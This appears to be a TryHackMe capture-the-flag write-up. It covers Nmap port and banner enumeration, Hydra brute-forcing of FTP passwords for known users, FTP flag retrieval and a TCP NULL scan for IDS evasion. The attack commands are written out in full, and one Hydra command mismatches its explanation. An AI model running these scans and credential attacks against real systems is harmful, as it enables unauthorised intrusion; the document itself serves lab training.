---
type: writeup
platform: TryHackMe
room: Net Sec Challenge
os: Linux
environment: Network Services
last_verified: 2026-10-06

techniques:
  - tcp-port-scanning
  - service-enumeration
  - banner-grabbing
  - password-brute-force
  - ftp-enumeration
  - null-scan

tools:
  - nmap
  - ftp
  - hydra
---
**Attack path:** TCP enumeration → service identification → banner discovery → FTP credential attack → FTP file access → TCP NULL scan

## 1. Network Enumeration

An initial Nmap service scan enumerated the common TCP ports and identified several exposed services:

```bash
nmap -sV -sC <TARGET_IP>
```

The important options are:

- `-sV` probes open ports to identify the actual service and, when possible, its version.
- `-sC` runs Nmap's default NSE scripts to collect additional service information such as banners and HTTP metadata.

Because the challenge explicitly mentioned services outside the common port range, a full TCP scan was also required:

```bash
nmap -Pn -p- <TARGET_IP>
```

Here:

- `-Pn` skips host discovery and treats the target as online.
- `-p-` scans all 65,535 TCP ports instead of Nmap's default set of approximately 1,000 common ports.

The scan revealed seven open TCP ports:

```bash
22/tcp    open  ssh
80/tcp    open  http
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
8081/tcp  open  blackice-icecap
10001/tcp open  scp-config
10121/tcp open  unknown
```


---

## 2. HTTP and SSH Banner Enumeration

Port `80` was examined with service detection:

```bash
nmap -sV -p80 <TARGET_IP>
```

Nmap identified the HTTP service version as:

```bash
THM{REDACTED}
```

The value originated from the HTTP response header:

```http
Server: THM{REDACTED}
```

The earlier `-sV -sC` scan also retrieved the SSH identification banner:

```bash
SSH-2.0-OpenSSH_8.2p1 THM{REDACTED}
```

SSH servers send an identification string at the beginning of a connection. In this challenge, the flag had deliberately been appended to that banner.

---

## 3. FTP Service on a Non-Standard Port

The unusual high ports were probed more aggressively:

```bash
nmap -Pn -sV --version-all -p10001,10121 <TARGET_IP>
```

`--version-all` tells Nmap to use all of its available service-version probes.

The result identified:

```bash
10121/tcp open  ftp  vsftpd 3.0.5
```

FTP normally listens on TCP port `21`, but this instance was using the non-standard port `10121`.

The FTP server version was therefore:

```text
vsftpd 3.0.5
```

### Anonymous Access

Before attacking credentials, anonymous FTP access was tested:

```bash
ftp <TARGET_IP> 10121
```

Using:

```text
Username: anonymous
Password: <blank>
```

returned:

```text
530 Login incorrect.
```

Anonymous access was therefore disabled.

---

## 4. FTP Credential Attack

The challenge provided two usernames obtained through social engineering:

```text
eddie
quinn
```

They were placed into a file:

```bash
printf "eddie\nquinn\n" > users.txt
```

Hydra was then used to test passwords from `rockyou.txt` against the FTP authentication service:

```bash
hydra -L eddie \
  -P /usr/share/wordlists/rockyou.txt \
  -s 10121 \
  -t 4 \
  -f \
  ftp://<TARGET_IP>

-L users.txt       use multiple usernames from a file
-P rockyou.txt     use a password wordlist
-s 10121           target the non-standard FTP port
-t 4               use four concurrent authentication tasks
-f                 stop after the first valid credential
ftp://              use Hydra's FTP module
```

Hydra recovered valid credentials for `eddie`:

```text
eddie:<REDACTED>
```

The account was accessed with:

```bash
ftp <TARGET_IP> 10121
```

However, directory enumeration showed only standard Unix profile files:

```bash
ls -la
```

There was no challenge flag in this account.

```bash
hydra -l quinn \
  -P /usr/share/wordlists/rockyou.txt \
  -s 10121 \
  -t 4 \
  -f \
  ftp://<TARGET_IP>
```

This recovered:

```text
quinn:<REDACTED>
```

---

## 5. FTP Flag Retrieval

After authenticating as `quinn`:

```bash
ftp <TARGET_IP> 10121
```

directory enumeration revealed:

```bash
ftp_flag.txt
```

The file was downloaded using the FTP `get` command:

```bash
get ftp_flag.txt
```

After leaving the FTP client, it could be read locally:

```bash
cat ftp_flag.txt
```

Result:

```bash
THM{REDACTED}
```

`get` is required because commands such as `cat` belong to the local shell and are not commands understood by the FTP client itself.

---

## 6. IDS Evasion Challenge

Port `8081` hosted a small challenge that measured the probability of an Nmap scan being detected by an IDS.

A conventional TCP connection begins with the three-way handshake:

```text
Client                     Server

SYN        ---------------->
           <--------------- SYN/ACK
ACK        ---------------->
```

Rather than establishing conventional TCP connections, a TCP NULL scan was used:

```bash
nmap -sN <TARGET_IP>
```

`-sN` sends TCP packets with none of the TCP control flags enabled:

```text
SYN = 0
ACK = 0
FIN = 0
RST = 0
PSH = 0
URG = 0
```

For systems following the expected RFC behaviour:

```text
closed port → RST response
open port   → usually no response
```

Because no response could also mean that a firewall silently dropped the packet, Nmap may classify such ports as:

```text
open|filtered
```

The NULL scan satisfied the challenge's stealth requirement and revealed the final flag:

```bash
THM{REDACTED}
```

A NULL scan should not be considered inherently invisible in real environments. Modern IDS/IPS solutions can explicitly detect unusual TCP flag combinations; the technique worked here because of the detection logic implemented by the challenge.

---

## Key Takeaways

- Nmap's default scan does not cover all 65,535 TCP ports; `-p-` is necessary when services may use unusual ports.
- A port number alone does not reliably identify the service behind it. `-sV` actively fingerprints the service.
- Protocol banners can disclose sensitive information before authentication.
- Testing anonymous FTP access is a useful low-cost check before attempting credentials.
- When usernames are already known, Hydra can focus the attack on password discovery rather than username enumeration.
- Services running on non-standard ports require tools such as Hydra to be explicitly given the correct port.
- TCP NULL scans infer port state from abnormal TCP behaviour rather than establishing normal connections, but they are not reliably stealthy against modern monitoring systems.